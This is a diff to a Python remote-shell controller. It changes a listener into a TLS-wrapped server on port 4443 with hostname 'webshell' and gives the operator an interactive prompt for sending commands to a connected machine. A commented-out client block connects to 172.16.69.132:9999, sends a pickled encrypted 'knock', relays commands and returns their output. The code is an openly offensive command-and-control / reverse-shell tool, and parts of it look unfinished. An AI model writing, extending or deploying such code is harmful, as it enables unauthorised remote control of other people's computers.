@@ -2,6 +2,11 @@ import os, socket, sys
 import ssl
 import threading
 
+hostname = "webshell"
+KEYFILE = 'server.key'
+CERTFILE = 'server.cert'
+
+
 def sock_create():
     try:
         global s
@@ -9,22 +14,14 @@ def sock_create():
         global port
         global sock
         host = ''
-        port = 9998
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
-    except socket.error as msg:
-        print("socket error : " + str(msg[0]))
-
-
-def sock_bind():
-    try:
+        port = 4443
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s = ssl.wrap_socket(sock, keyfile=KEYFILE, certfile=CERTFILE, server_side=True)
         print("Binding Port ... ")
         s.bind((host, port))
-        s.listen(1)
+        s.listen(10)
     except socket.error as msg:
         print("socket error : " + str(msg[0]))
-        print("Retrying ...")
-        sock_bind()
 
 
 def sock_accept():
@@ -43,9 +40,8 @@ def sock_accept():
 
 
 def menu():
-    threading.Thread(sock_accept()).start()
     while 1:
-        command = raw_input(str(addr[0]) + '@' + str(hostname) + '>')
+        command = raw_input(str(addr[0]) + '@shell>')
         if command == "quit" or command == 'exit':
             conn.close()
             s.close()
@@ -58,8 +54,57 @@ def menu():
 
 def main():
     sock_create()
-    sock_bind()
-    threading.Thread(sock_accept()).start()
+    sock_accept()
 
 
 main()
+"""
+import socket
+import ssl
+from encrypt import *
+import pickle
+
+
+def connect(command_to_run, ip):
+    try:
+        global host
+        global port
+        global s
+        global sock
+        global result
+        global command
+
+        command = command_to_run
+
+        host = '172.16.69.132'
+        # host = ''
+        port = 9999
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
+        print("Trying to Connect")
+        s.connect((host, port))
+        print("Connection Established")
+        knock = encrypt_message()
+        s.send(pickle.dumps(knock))
+        time.sleep(1)
+        return receive()
+    except socket.error as msg:
+        return "socket error : " + str(msg[0])
+
+
+def receive():
+    if command == 'quit' or command == 'exit':
+        s.close()
+    else:
+        return send(command)
+
+
+def send(args):
+    s.send(args)
+    result = s.recv(16384)
+    print(result)
+    s.close()
+    return str(result)
+"""
+
+
